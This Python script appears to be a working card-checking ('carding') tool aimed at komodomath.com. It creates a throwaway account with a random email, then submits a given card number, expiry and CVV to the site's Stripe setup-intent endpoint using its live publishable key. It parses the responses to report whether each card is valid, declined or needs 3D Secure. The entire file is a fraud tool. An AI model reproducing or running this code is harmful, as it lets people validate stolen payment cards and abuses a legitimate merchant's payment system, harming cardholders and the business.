from httpx import AsyncClient
from utilsdf.functions import capture, random_email


async def ko(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        r = await session.get(
            "https://komodomath.com/signup?learners=1",
        )

        csrf = capture(r.text, '"token" value="', '"')

        head = {
            "Host": "komodomath.com",
            "X-CSRF-Token": f"{csrf}",
            "Content-Type": "application/json;charset=UTF-8",
        }

        mail = random_email()

        post = {
            "email": mail,
            "email_confirm": mail,
            "firstname": "Sachio",
            "lastname": "YT",
            "password": "Sachio900*",
            "num_learners": "1",
            "learners": ["", "", "", "", ""],
            "stickers": True,
            "address_opt": True,
            "address": "",
            "post_code": "",
            "address_zip": "",
            "country": "",
            "payment_method": "",
            "plans": 0,
            "coupon": "",
        }

        r2 = await session.post(
            "https://komodomath.com/signup/api/create-lead",
            headers=head,
            json=post,
        )
        token = capture(r2.text, '"token":"', '"')
        post3 = {"token": token}
        r3 = await session.post(
            "https://komodomath.com/signup/api/setup",
            headers=head,
            json=post3,
        )
        cs = capture(r3.text, '"client_secret":"', '"')
        seti = capture(r3.text, '"id":"', '"')
        post4 = f"payment_method_data[type]=card&payment_method_data[billing_details][email]={mail}&payment_method_data[billing_details][name]=Sachio+YT&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={month}&payment_method_data[card][exp_year]={year}&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51&payment_method_data[time_on_page]=49074&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_L4NONADbHPsRApU7HmyAFhVN&client_secret={cs}"

        head4 = {
            "Host": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
        }

        r4 = await session.post(
            f"https://api.stripe.com/v1/setup_intents/{seti}/confirm",
            headers=head4,
            data=post4,
        )
        r4 = r4.text
        if "your card number is incorrect" in r4.lower():
            return "Your card number is incorrect"
        if "requires_action" in r4:
            return "3D xD"
        st = capture(r4, '"status": "', '"')
        code = capture(r4, '"code": "', '"')
        msg = capture(r4, '"message": "', '"')
        cvc = capture(r4, '"cvc_check": ', " }")
        d_code = capture(r4, '"decline_code": "', '"')
        return st, code, msg, cvc, d_code
